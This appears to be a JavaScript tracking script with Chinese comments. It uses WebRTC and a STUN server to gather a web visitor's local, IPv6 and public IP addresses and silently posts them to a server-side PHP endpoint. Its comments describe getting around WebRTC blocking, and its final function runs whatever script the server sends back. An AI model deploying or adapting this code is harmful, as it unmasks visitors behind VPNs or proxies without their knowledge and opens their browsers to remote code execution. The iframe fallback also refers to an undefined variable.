function uil(method, ip) {
    $.ajax({
        url: "./class/common.php?t=" + (new Date()).getTime(),
        type: "POST",
        data: {
            method: method,
            ip: ip,
            data: ""
        }
    });
}
//获取客户IP
function getIPs(callback) {
    var ip_dups = {};

    //为chrome和firefox兼容
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;

    //通过iframe绕过对webrtc的封锁（或许存在）
    if (!RTCPeerConnection) {
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }

    //构建最小数据连接
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };

    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};

    //构造一个新的RTC连接管道
    var pc = new RTCPeerConnection(servers, mediaConstraints);

    function handleCandidate(candidate) {
        //匹配IP地址
        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|(?:[0-9a-f]{4}:{1,2}){6,7}[0-9a-f]{4})/
        //console.log(candidate);
        if (!ip_regex.exec(candidate)) {
            return;
        }
        var ip_addr = ip_regex.exec(candidate)[1];

        //删除重复的
        if (ip_dups[ip_addr] === undefined)
            callback(ip_addr);

        ip_dups[ip_addr] = true;
    }

    //监听候选事件
    pc.onicecandidate = function (ice) {

        //跳过未被选中事件
        if (ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };

    //创建虚假数据管道
    pc.createDataChannel("");

    //创建一个sdp
    pc.createOffer(function (result) {

        //触发stun服务器请求
        pc.setLocalDescription(result, function () {
        }, function () {
        });

    }, function () {
    });

    //等一会让程序跑完
    setTimeout(function () {
        //从本地描述中获取候选信息
        var lines = pc.localDescription.sdp.split('\n');

        lines.forEach(function (line) {
            if (line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}
//将IP地址插入页面
getIPs(function (ip) {
    var li = document.createElement("li");
    li.textContent = ip;
    WebRTC_IPv4 = 1;
    WebRTC_IPv6 = 2;
    WebRTC_LAN = 3;
    //您的局域网IP地址
    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
        //alert(ip);
        uil(WebRTC_LAN, ip);
    }
    //您的IPv6地址(如果存在)
    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
        //alert(ip);
        uil(WebRTC_IPv6, ip);
    }
    //您的公网IP地址
    else {
        //alert(ip);
        uil(WebRTC_IPv4, ip);
    }
});
function ajquery(data) {
    if (data.ret == "ok") {
        $.ajax({
            url: "./class/common.php?t=" + (new Date()).getTime(),
            type: "POST",
            data: {
                method: "4",
                ip: data.ip,
                data: data.data
            },
            dataType: "script"
        });
    }
}